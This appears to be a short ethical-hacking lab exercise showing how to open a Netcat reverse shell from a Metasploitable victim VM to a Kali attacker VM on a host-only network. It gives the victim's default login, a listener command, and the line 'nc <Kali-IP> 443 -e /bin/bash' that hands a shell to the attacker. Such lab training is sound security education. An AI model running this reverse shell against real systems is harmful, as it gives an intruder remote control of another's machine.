## EH – Netcat Shell 01: Reverse Shell

## Objective
Learn how to use Netcat to establish a **reverse shell** on a target machine.

## Purpose
Netcat is a computer networking utility for reading/writing to network connections using TCP or UDP.

## Tools
- Kali Linux VM (Attacker)
- Metasploitable VM (Victim)

## Steps

### 1. Setup
Put both VMs on the same **host-only network**.  
Login to Metasploitable: `msfadmin/msfadmin`.

### 2. Start Listener on Kali
`bash
ifconfig     # find Kali IP
nc -l -v -n -p 443

3. Connect from Victim

On Metasploitable:

sudo nc <Kali-IP> 443 -e /bin/bash

4. Verify

On Kali, test:

whoami
id


✅ You now control the victim from attacker.
